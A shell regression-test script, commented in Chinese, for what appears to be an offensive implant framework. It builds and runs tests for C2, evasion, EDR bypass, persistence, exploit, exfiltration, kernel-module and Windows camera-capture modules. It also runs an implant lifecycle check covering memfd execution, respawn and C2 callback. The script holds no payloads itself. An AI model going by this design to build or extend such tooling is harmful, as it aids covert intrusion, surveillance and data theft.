#!/bin/sh
# dayanjing 全模块回归
# 覆盖：C 模块单测 + 跨模块集成 + Python 侧
# 每一步都套 timeout，任何一个卡住都不拖垮整体
set -u
ROOT=$(cd "$(dirname "$0")/.." && pwd)
failed=0
passed=0
skipped=0

# 回归一律从"未被变异污染"的树开始。
# 变异审计被强杀时会留下 .mutbak 与注入后的源码；若不先自愈，本次回归
# 的每一个"通过"都是在带缺陷的二进制上得到的，报告全绿却毫无意义。
# 实测发生过：front.c 的 tls_write 错误返回被抹掉后仍被提交进树。
if [ -f "$ROOT/scripts/mutation_audit.py" ]; then
    timeout 60 python3 "$ROOT/scripts/mutation_audit.py" heal || true
fi

# 单个测试用例的超时（秒）。默认 120 足够绝大多数单测。
# 例外必须写明理由：12_exploit 的 canary/PIE 爆破是**逐字节试探**，
# 每个字节平均 128 次、每次一次 fork+连接，单轮约 1900 次试探，
# 两轮（含 ASLR 对照）实测约 128 秒。这不是卡住，是爆破本身的代价。
tmo_for() {
    case "$1" in
        12_exploit) echo 600 ;;
        *)          echo 120 ;;
    esac
}

# C 模块：编译后跑 build/ 下所有可执行测试
# 注意 build/linux/ 这类子目录也要扫到（agent_windows）
run_c() {
    d="$ROOT/$1"
    name="$1"
    [ -d "$d" ] || { printf "=== %-16s SKIP(目录不存在)\n" "$name"; return; }
    printf "=== %-16s " "$name"
    if ! (cd "$d" && timeout 300 make >/tmp/mk_$name.log 2>&1); then
        echo "BUILD FAIL"
        tail -5 /tmp/mk_$name.log
        failed=$((failed+1)); return
    fi
    ok=1
    # 只取可执行文件，排除 .c/.o（.o 也会被 -perm -u+x 误匹配）
    tests=$(find "$d/build" -type f -name 'test_*' ! -name '*.c' ! -name '*.o' -perm -u+x 2>/dev/null | sort)
    if [ -z "$tests" ]; then
        # 一个测试都没找到却判 PASS，是最危险的假通过：模块可能压根没构建
        # 出测试二进制（实测：26_lateral_auto 的 all 目标只产出 .o）。
        echo "FAIL -> 未找到任何测试可执行文件（build/ 为空 or 默认目标不构建测试）"
        failed=$((failed+1)); return
    fi
    for t in $tests; do
        timeout "$(tmo_for "$name")" "$t" >/tmp/t_$name.log 2>&1
        rc=$?
        # 变异审计发现：被测进程在 ptrace_stop 等场景下，"timeout 已到期"
        # 与"进程仍存活"可以同时成立，且 waitpid 可能返回 0，于是挂起的测试
        # 被记为退出码 0 -> 误判 PASS。零输出是唯一可靠的挂起判据：
        # 正常测试必定打印结果行。
        if [ ! -s /tmp/t_$name.log ]; then
            ok=0
            echo "FAIL -> $t (零输出：疑似挂起/被杀，退出码 $rc 不可信)"
            break
        fi
        if [ $rc -eq 77 ]; then
            # 退出码 77 = 环境不具备（如无 root 读不了 /proc/kcore）。
            # 记为 SKIP：既不冒认通过，也不算作代码缺陷。
            echo "SKIP -> $(basename "$t")"
            grep -E '^\[SKIP\]' /tmp/t_$name.log | head -2
            skipped=$((skipped+1))
            continue
        fi
        if [ $rc -ne 0 ]; then
            ok=0
            echo "FAIL -> $t"
            tail -6 /tmp/t_$name.log
            break
        fi
    done
    if [ $ok -eq 1 ]; then echo "PASS"; passed=$((passed+1)); else failed=$((failed+1)); fi
}

# 跨模块集成：单独编译并运行
run_int() {
    name="$1"; shift
    printf "=== %-16s " "$name"
    # 源路径是相对 ROOT 的，必须先 cd，否则找不到 tests/*.c
    if (cd "$ROOT" && timeout 120 cc -std=c11 -O2 -Wall -Wextra -Wpedantic "$@" >/tmp/cc_$name.log 2>&1) \
       && timeout 120 /tmp/bin_$name >/tmp/t_$name.log 2>&1; then
        echo "PASS"; passed=$((passed+1))
    else
        echo "FAIL"
        tail -6 /tmp/cc_$name.log /tmp/t_$name.log 2>/dev/null
        failed=$((failed+1))
    fi
}

# Python 侧
run_py() {
    printf "=== %-16s " "$1"
    if timeout 180 python3 "$ROOT/$2" >/tmp/py_$1.log 2>&1; then
        echo "PASS  $(tail -1 /tmp/py_$1.log)"; passed=$((passed+1))
    else
        echo "FAIL"; tail -6 /tmp/py_$1.log; failed=$((failed+1))
    fi
}

# huffman 交叉验证的用例文件在源码树里（24_front/tests/data/hf_cases.txt）。
# 不导出的话 test_huffman 会回退到 /tmp/hf_cases.txt，该文件在干净环境里
# 不存在，于是返回 77 被记成 SKIP —— 表面不失败，实际这条验证从没跑过。
# 显式导出，让它真正参与回归。
export HF_CASES="$ROOT/24_front/tests/data/hf_cases.txt"

for m in 00_crypto 01_proto 02_c2 03_transport 04_agent 05_server 06_db 07_ui \
         08_lateral 09_persistence 10_evasion 11_edr_bypass 12_exploit \
         14_p2p 16_initial_access 17_loader 18_privilege 19_defense 20_packer \
         21_exfil 22_kern 23_lkm 24_front 25_tls 26_lateral_auto agent_windows; do
    run_c "$m"
done

# 常量时间比较的【机器码级】守卫。
#
# 为什么单列一项，而不是并入 00_crypto 的 run_c：
#   mutation_audit 的 M13/M14/M15 捕获的是【源码级】早退。但源码语义正确
#   不等于最终机器码无早退 —— 编译器理论上可把无副作用的累积循环优化成
#   条件跳出。那一层源码测试永远测不到，只能审查汇编。人审一次会随时间
#   腐烂（换编译器、改代码就没人再查），故固化为可复跑判据并纳入回归。
#
# 依赖 build/crypto_gcm.o（生产构建，不带 CRYPTO_CT_INSTRUMENT），
# 该产物已由上方 00_crypto 的 run_c 构建。
run_ct_asm() {
    printf "=== %-16s " "ct_asm_guard"
    # 依赖 build/crypto_gcm.o（生产构建，不带 CRYPTO_CT_INSTRUMENT）。
    # 00_crypto 的默认 make 只产出测试二进制，不产出该 .o —— 此前守卫能过
    # 纯属产物恰好还留在 build/ 里。显式构建，失败即报，不靠"碰巧还在"。
    if ! (cd "$ROOT/00_crypto" && make build/crypto_gcm.o >/tmp/mk_ctasm.log 2>&1); then
        echo "BUILD FAIL"; tail -5 /tmp/mk_ctasm.log; failed=$((failed+1)); return
    fi
    if (cd "$ROOT/00_crypto" && python3 scripts/check_ct_asm.py >/tmp/t_ct_asm.log 2>&1); then
        echo "PASS"; grep -E "^\[PASS\]" /tmp/t_ct_asm.log | sed 's/^/    /'
        passed=$((passed+1))
    else
        echo "FAIL"; cat /tmp/t_ct_asm.log
        failed=$((failed+1))
    fi
}
run_ct_asm

# 单体植入体：全仓唯一"把所有能力链进同一个可部署二进制"的验证。
# 形态与 run_c 的 test_* 不同（单个可执行 + --selftest），故单独处理。
#
# selftest 走真实 TCP 双进程：子进程 = 服务端，父进程 = 植入体，两者经
# 环回 TCP 完成握手 -> 任务通道 -> 采集回传。服务端 stdout/stderr 写文件
# 而不是继承管道，因此不会让回归脚本等 EOF 挂起。
run_mono() {
    printf "=== %-16s " "monolith"
    if ! (cd "$ROOT/monolith" && timeout 300 make >/tmp/mk_monolith.log 2>&1); then
        echo "BUILD FAIL"; tail -5 /tmp/mk_monolith.log
        failed=$((failed+1)); return
    fi
    # --run-ms 必须有界：无上界时若帧被去重跳过，循环永不退出。
    # --budget 给足：默认预算下 3 秒窗口累积不足 1 个覆盖信元，
    # 覆盖恒为 0 是预算与时长的正常关系而非缺陷，但那样就测不到覆盖路径。
    if (cd "$ROOT/monolith" && timeout 120 ./implant --selftest --run-ms 3000 \
            --budget 307200 --allow-sandbox >/tmp/t_monolith.log 2>&1); then
        echo "PASS"; passed=$((passed+1))
    else
        echo "FAIL"; tail -12 /tmp/t_monolith.log
        failed=$((failed+1))
    fi
}
run_mono

# 完整生命周期：烧录配置 -> 打包 -> 投递 -> memfd 执行 -> 驻留(假根)
#   -> 死亡 -> 按驻留条目重生 -> 回连 C2。
# 每个环节此前都各自验证过，但"重生后仍能回连"这条从未串起来验过，
# 而那正是持久化唯一的意义所在。
run_life()
{
    printf "=== %-16s " "lifecycle"
    if timeout 300 bash "$ROOT/25_deploy/scripts/lifecycle.sh" \
            >/tmp/t_lifecycle.log 2>&1; then
        echo "PASS"; passed=$((passed+1))
    else
        echo "FAIL"; tail -20 /tmp/t_lifecycle.log
        failed=$((failed+1))
    fi
}
run_life

run_int integration \
    -I03_transport/include -I10_evasion/include -I06_db/include -I07_ui/include \
    -o /tmp/bin_integration tests/integration.c \
    03_transport/build/*.o 10_evasion/build/*.o 06_db/build/*.o 07_ui/build/*.o

run_int e2e_camo \
    -I03_transport/include -I10_evasion/include \
    -o /tmp/bin_e2e_camo tests/e2e_camo.c \
    03_transport/build/*.o 10_evasion/build/*.o

run_int proto_c2_layer \
    -I01_proto/include -I02_c2/include \
    -o /tmp/bin_proto_c2_layer tests/proto_c2_layering.c \
    01_proto/build/frame.o 02_c2/build/c2_frame.o 02_c2/build/c2.o \
    02_c2/build/crypto_gcm.o 02_c2/build/crypto_hash.o

# C <-> Python 双向协议对齐（密钥派生 + 帧格式 + AAD）。
# 单独一个脚本驱动：它需要 Python 侧先生成夹具，缺夹具时 C 侧返回 77(SKIP)，
# 由脚本统一判定，避免"没比对过"被当成"比对一致"。
if [ -f "$ROOT/scripts/run_c2_align.sh" ]; then
    if sh "$ROOT/scripts/run_c2_align.sh" > /tmp/c2_align.log 2>&1; then
        echo "  [PASS] c2_align"
        passed=$((passed + 1))
    else
        echo "  [FAIL] c2_align"
        grep -E "FAIL" /tmp/c2_align.log | sed 's/^/         /'
        failed=$((failed + 1))
    fi
fi

run_py 13_c2_server_py 13_c2_server/tests/test_server.py

# 采集产物接收端：C 侧 21_exfil 真编码 -> Python ExfilSink 真解码的跨语言对齐。
# 依赖 21_exfil/build/dump_cells，缺失时先构建。
if [ ! -x "$ROOT/21_exfil/build/dump_cells" ] || \
   [ ! -x "$ROOT/21_exfil/build/dump_task" ]; then
    make -C "$ROOT/21_exfil" > /dev/null 2>&1
fi
run_py 13_c2_server_exfil 13_c2_server/tests/test_exfil_sink.py

# C2 下行任务通道：远程开采/停采/改参数。C 侧 dump_task 真编码 <-> Python 双向对齐。
run_py 13_c2_server_task 13_c2_server/tests/test_exfil_task.py
run_py 13_c2_server_cache 13_c2_server/tests/test_session_cache.py
run_py 13_c2_server_resume 13_c2_server/tests/test_session_resume.py
run_py 13_c2_server_seqin 13_c2_server/tests/test_seq_in.py

# 真实第三方软件漏洞挖掘：Pillow _imagingcms 堆溢出探测工具自检
# 只验证工具逻辑（偏移/版本判定/指针构造），不触发崩溃（触发需受影响版本）
run_py 12_exploit_pillowcms 12_exploit/tests/test_pillow_cms.py

# Windows 后端 cam_mf.cpp 的逻辑验证。MinGW 不可得（apt/release 均 403），
# 改用 SDK shim 在 Linux 下真实编译并用 mock 设备真跑其逻辑。
echo "=== winshim_mf ==="
if make -C "$ROOT/agent_windows" winshim > /tmp/winshim.log 2>&1 \
   && grep -q "19 pass, 0 fail" /tmp/winshim.log; then
    echo "  [PASS] winshim_mf (cam_mf 19/19)"
    passed=$((passed + 1))
else
    echo "  [FAIL] winshim_mf  (见 /tmp/winshim.log)"
    tail -15 /tmp/winshim.log
    failed=$((failed + 1))
fi

# 部署自检：真实起 4 节点（endpoint->edge0->edge1->core）+ echo 目标，
# 建洋葱电路并校验端到端回显一致。这不是单测，是部署级贯通验证。
if [ -x /usr/bin/python3 ] && [ -f 14_p2p/tools/deploy.py ]; then
    echo "=== deploy_4node ==="
    if python3 14_p2p/tools/deploy.py \
        --topology 14_p2p/tools/topo_4node.json \
        --out /tmp/dep_selftest --run > /tmp/dep_selftest.log 2>&1 \
        && grep -q "端到端贯通 PASS" /tmp/dep_selftest.log; then
        echo "  [PASS] deploy_4node"
        passed=$((passed + 1))
    else
        echo "  [FAIL] deploy_4node  (见 /tmp/dep_selftest.log)"
        tail -12 /tmp/dep_selftest.log
        failed=$((failed + 1))
    fi
fi

# 跨网络命名空间部署验证：4 个节点各占独立网络栈 + 独立目标栈，
# 经网桥互通 —— 跨主机部署会遇到的绑定/路由/邻居问题在这里真实暴露。
# 需要 root 与 ip/netns 能力，不具备时跳过而不计失败。
if [ "$(id -u)" = "0" ] && command -v ip >/dev/null 2>&1 \
   && ip netns list >/dev/null 2>&1 && [ -f "$ROOT/14_p2p/tools/deploy_crossns.sh" ]; then
    echo "=== deploy_crossns ==="
    if timeout 300 bash "$ROOT/14_p2p/tools/deploy_crossns.sh" > /tmp/xns_reg.log 2>&1 \
       && grep -q "端到端贯通 PASS" /tmp/xns_reg.log; then
        echo "  [PASS] deploy_crossns (4 独立网络栈贯通)"
        passed=$((passed + 1))
    else
        echo "  [SKIP] deploy_crossns 未通过（见 /tmp/xns_reg.log）"
        grep -E "FAIL|Error" /tmp/xns_reg.log | head -5
    fi
else
    echo "=== deploy_crossns   SKIP(无 root/netns 能力) ==="
fi

# ---------------------------------------------------------------------------
# 变异审计：把"此前声称已修复"的缺陷注入回退，验证测试是否真能捕获。
# 放在最后：它会改源码再恢复，中途跑会污染后续用例的构建产物。
#
# 常态化用抽样（默认 1 个）：全量 6 个逐个重建太慢，曾导致整个回归超时。
# 每次抽样不同，长期收敛到全覆盖；要一次性全量用 MUTATION=full。
#
# 判定：存活(测试仍全绿) 与 审计失效(锚点腐烂/挂起) 都计入 failed。
# 后者尤其不能放过——锚点失效若记 SKIP，变异集合会静默腐烂，
# 报告上永远"0 存活"，实际审计面在缩小。
#
# 秘密比较守卫：枚举全仓每一处 memcmp，要求逐处分类。
#
# 为什么必须进回归（M9 的教训推广）：M9/M13/M14/M15 只钉住了
# crypto_constant_time_eq 这一个【函数】。但风险面在【调用点】——
# 任何人随时可以在别处写一行 memcmp(tag, expected, n)，功能正确、
# 测试全绿，却引入逐字节早退的时序预言机；源码插桩看不见它（那个
# 函数根本没被调用），机器码守卫也看不见它（它审的是函数体）。
# 未分类即失败，新增任何一处 memcmp 都会被拦下要求人工判定。
if [ -f "$ROOT/scripts/check_secret_cmp.py" ]; then
    echo "=== check_secret_cmp（全仓 memcmp 分类守卫） ==="
    if python3 "$ROOT/scripts/check_secret_cmp.py" > /tmp/seccmp.log 2>&1; then
        echo "  [PASS] 全仓 memcmp 均已分类且无秘密比较"
        grep -E "^\[INFO\]|^\[WARN\]" /tmp/seccmp.log | sed 's/^/         /'
        passed=$((passed + 1))
    else
        echo "  [FAIL] 秘密比较守卫未通过（见 /tmp/seccmp.log）"
        sed -n '/\[FAIL\]/,$p' /tmp/seccmp.log | head -40
        failed=$((failed + 1))
    fi
fi

# ---------------------------------------------------------------------------
# 结构化变异真值的漂移检查。
#
# 这两组用例的期望值（容忍/拒绝）不是设计出来的，是拿真实 OpenSSL 逐例
# 实测出来的，然后【固化】进头文件。固化就意味着会腐：OpenSSL 升级、换了
# 对端实现、甚至有人手改头文件，真值都会漂移，而测试会继续拿旧真值跑出
# 一片全绿——它验的已经不是"我们和真实实现是否一致"，而是"我们和一份
# 过期快照是否一致"。
#
# 手写期望值曾经直接制造过一个假缺陷：C10_hs_len_plus10 被写成必须拒绝，
# 而 OpenSSL 实际是在等剩余字节、并不发告警。手写的 47 例里只错这一例，
# 但足以把"两边完全一致"记成缺陷，引着人去改一段本来正确的代码。
#
# 判据用逐字节比对而非只比 expect：头文件里还固化着报文本体，生成器改了
# 而头文件没重新生成，同样会让测试跑的不是当前用例。
#
# 退出码 77 = 环境不具备（无 openssl 或缺证书）。记为 SKIP 而非 PASS：
# 未验证不等于无漂移，显式报出来，不许混进通过数里。
for g in gen_ch_struct gen_cke_struct; do
    if [ -f "$ROOT/scripts/$g.py" ]; then
        echo "=== $g --check（结构化变异真值漂移） ==="
        python3 "$ROOT/scripts/$g.py" --check > /tmp/$g.log 2>&1
        rc=$?
        if [ $rc -eq 0 ]; then
            echo "  [PASS] $(grep -E '^\[PASS\]' /tmp/$g.log | sed 's/^\[PASS\] //')"
            passed=$((passed + 1))
        elif [ $rc -eq 77 ]; then
            echo "  [SKIP] 未验证：$(grep -E '^\[SKIP\]' /tmp/$g.log | head -1 | sed 's/^\[SKIP\] //')"
            skipped=$((skipped + 1))
        else
            echo "  [FAIL] 真值已漂移或检查失败（见 /tmp/$g.log）"
            # 区分两种故障：「起不来」（环境/端口问题）与「真值漂移」（真缺陷）。
            # 不区分的话，一次端口冲突会被当成产品缺陷去查。
            grep -E "^\[FATAL\]" /tmp/$g.log | sed 's/^/         [环境] /'
            grep -E "^\[FAIL\]|^       " /tmp/$g.log | sed 's/^/         /'
            failed=$((failed + 1))
        fi
    fi
done

# ---------------------------------------------------------------------------
# 去重守卫：两个生成器的探测基础设施必须共用 tls_truth.py。
#
# 这一层守护的是上面 --check 数字的【可比性】。两份实现此前是逐字复制的，
# 一旦只在一侧修了探测逻辑（端口重试、判据收紧、超时窗口），另一侧不跟着
# 变，而两边各自固化下来的期望值仍然"全绿" —— 同一套真值体系里出现两套
# 口径，且固化常量不会暴露这个分叉。
# ---------------------------------------------------------------------------
if [ -f "$ROOT/scripts/check_gen_dedup.py" ]; then
    echo "=== check_gen_dedup（探测基础设施去重） ==="
    python3 "$ROOT/scripts/check_gen_dedup.py" > /tmp/gen_dedup.log 2>&1
    rc=$?
    if [ $rc -eq 0 ]; then
        echo "  [PASS] $(grep -E '^\[PASS\]' /tmp/gen_dedup.log | sed 's/^\[PASS\] //')"
        passed=$((passed + 1))
    else
        echo "  [FAIL] 探测基础设施出现重复实现"
        grep -E '^       ' /tmp/gen_dedup.log | sed 's/^/         /'
        failed=$((failed + 1))
    fi
fi

# ---------------------------------------------------------------------------
# check_guards（Python 守卫自身的正反双向防回归）
#
# 上面两个 check_* 是仓库里唯二没有测试的 Python 守卫：C 侧每条断言都有
# 变异条目盯着，它们没有。于是唯一失效模式无人看管 —— 守卫自己被改坏后
# 恒返回"通过"，报告一片全绿。
#
# 本项跑正反双向（合规 fixture 须 PASS、违规 fixture 须 FAIL），任一侧不符
# 即判失败。只跑上面两项无法替代：它们只证明"此刻通过"，证明不了"该红的
# 时候会红"。
# ---------------------------------------------------------------------------
if [ -f "$ROOT/scripts/check_guards.py" ]; then
    echo "=== check_guards（Python 守卫自身双向有效） ==="
    python3 "$ROOT/scripts/check_guards.py" > /tmp/guards.log 2>&1
    rc=$?
    if [ $rc -eq 0 ]; then
        echo "  [PASS] $(grep -E '^\[PASS\]' /tmp/guards.log | sed 's/^\[PASS\] //')"
        passed=$((passed + 1))
    else
        echo "  [FAIL] Python 侧守卫自身失效（恒绿或恒红）"
        grep -E '^       |^\[FATAL\]' /tmp/guards.log | sed 's/^/         /'
        failed=$((failed + 1))
    fi
fi

# ---------------------------------------------------------------------------
# Python runner 判定标记守卫的自检。
#
# 守护的是变异审计【报告里每一个 CAUGHT 的含义】。退出码非零不等于抓到了
# 缺陷：生成器或守卫自己崩溃时同样 rc=1，与"真漂移/真违规"在退出码上完全
# 一样。不区分的话，报告显示一片 CAUGHT，读起来像所有缺陷都有防回归，实际
# 其中一部分只是工具崩了 —— M28~M30 此前就混着这一类。
#
# 不能靠一条普通变异条目来锁：CAUGHT 在归类时被直接跳过、永远不计入失败，
# 所以守卫退化会被 CAUGHT 静默接受。故用独立子命令直接断言状态字。
# ---------------------------------------------------------------------------
if [ -f "$ROOT/scripts/mutation_audit.py" ]; then
    echo "=== mutation_audit selftest-py（崩溃不得算作捕获） ==="
    python3 "$ROOT/scripts/mutation_audit.py" selftest-py > /data/ma_selftest.log 2>&1
    rc=$?
    if [ $rc -eq 0 ]; then
        echo "  [PASS] $(grep -E '^\[PASS\]' /data/ma_selftest.log | sed 's/^\[PASS\] //')"
        passed=$((passed + 1))
    else
        echo "  [FAIL] Python runner 判定标记守卫失效（崩溃被记成捕获）"
        grep -E '^\[BAD\]|^\[FAIL\]' /data/ma_selftest.log | sed 's/^/         /'
        failed=$((failed + 1))
    fi
fi

# ---------------------------------------------------------------------------
# 构建契约审计：每个模块声明的测试二进制，是否都会被回归实际调用的目标构建。
#
# 这一层守护的是上面所有数字的【可信度】。回归先 `make` 再执行 build/ 下的
# test_*，于是有个隐含契约：make 必须产出回归会跑的每一个二进制。契约一破，
# build/ 里上一次 `make test` 留下的旧二进制会被继续跑——源码改了、产物没重建、
# 报告照样全绿。实测三处：
#   08_lateral  all 只产出库          -> 清空 build 后 make 产出 0 个测试
#   14_p2p      all 只产出 2/16       -> 14 个套件一直在跑陈旧产物
#   21_exfil    all 漏 test_tol
#   26_lateral_auto  E2E 变量定义在 all 之后，先决条件展开为空
# 归为 failed 而非 warn：这里一旦失守，前面所有 pass 数都不可信。
if [ -f "$ROOT/scripts/audit_makefile_tests.py" ]; then
    echo "=== audit_makefile_tests（构建契约） ==="
    if python3 "$ROOT/scripts/audit_makefile_tests.py" > /tmp/mkaudit.log 2>&1; then
        echo "  [PASS] 各模块测试二进制均由回归调用的目标构建"
        grep -E "^\[WARN\]" /tmp/mkaudit.log | sed 's/^/         /'
        passed=$((passed + 1))
    else
        echo "  [FAIL] 构建契约被破坏：有测试二进制不由 make 产出，"
        echo "         build/ 中可能正被执行陈旧产物（见 /tmp/mkaudit.log）"
        grep -E "^\[MISS\]|^\[ERR \]" /tmp/mkaudit.log | sed 's/^/         /'
        failed=$((failed + 1))
    fi
fi

MUT_MODE=${MUTATION:-sample:1}
if [ "$MUT_MODE" != "off" ] && [ -f "$ROOT/scripts/mutation_audit.py" ]; then
    echo "=== mutation_audit ==="
    case "$MUT_MODE" in
        full)     MUT_ARGS="" ;;
        sample:*) MUT_ARGS="--sample ${MUT_MODE#sample:}" ;;
        *)        MUT_ARGS="" ;;
    esac
    if timeout 1200 python3 "$ROOT/scripts/mutation_audit.py" $MUT_ARGS \
        > /tmp/mut.log 2>&1; then
        echo "  [PASS] mutation_audit ($MUT_MODE)"
        # 必须带上"已知盲区"两栏：它们是 SURVIVED 但审计不失败的项，
        # 若只 grep 前三项，回归报告会完全看不见"哪些缺陷测不了"，
        # 等于把盲区单列出来的努力白费掉。
        grep -E "^捕获|^存活|^审计失效|^符合预期|^已知盲区|^\[!\]|^    M[0-9]" \
            /tmp/mut.log | sed 's/^/         /'
        passed=$((passed + 1))
    else
        echo "  [FAIL] mutation_audit ($MUT_MODE)  (见 /tmp/mut.log)"
        sed -n '/=== 变异审计结果 ===/,$p' /tmp/mut.log
        failed=$((failed + 1))
    fi
fi

echo "-------- passed: $passed  failed: $failed  skipped: $skipped --------"
exit $failed
